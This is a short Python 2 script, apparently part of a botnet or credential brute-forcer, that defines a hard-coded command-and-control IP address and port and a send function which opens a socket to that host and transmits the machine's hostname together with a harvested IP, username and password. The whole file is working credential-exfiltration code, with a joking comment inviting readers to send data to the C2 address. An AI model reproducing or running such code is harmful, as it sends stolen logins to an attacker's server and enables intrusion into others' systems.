import socket, sys

C2 = "138.197.38.104" #Use 138.197.38.104 if you kindly wish to send me the data
C2PORT = 8989

def send(ip, usr, pw):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((C2, C2PORT))
            s.send(socket.gethostname() + " ---> " + ip + " " + usr + " " + pw)
        except socket.error, ex:
            print ex
    except KeyboardInterrupt:
        return False
    finally:
        s.close()
